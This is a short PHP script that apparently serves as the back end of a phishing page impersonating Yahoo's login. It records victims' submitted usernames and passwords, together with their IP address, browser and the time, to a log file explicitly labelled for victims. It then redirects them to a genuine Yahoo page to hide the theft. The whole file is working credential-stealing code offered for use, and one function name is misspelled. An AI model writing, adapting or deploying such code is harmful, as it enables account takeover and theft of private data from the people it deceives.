
<?php
$date = date("Y/m/d");
$time = date("h:i:sa");
header('Location: https://login.yahoo.com/account/challenge/session-expired');
$yh_usern = $_POST['username'];
$yh_pass =  $_POST['password'] ;
$browser = $_SERVER['HTTP_USER_AGENT'];

$client_ip =  $_SERVER['HTTP_CLIENT_IP'];
$file = fopen("yh_thite_log.txt","a");
fwrite($file,"victiun ip :$client_ip \n");  
fwrite($file,"victum browse : $browser \nusername : $yh_usern \n");
fwrite($file,"password : $yh_pass \n");
fwrite($file,"login time : \n  date : $date \n  time : $time \n################################ \n");
fcolse($file);

?>
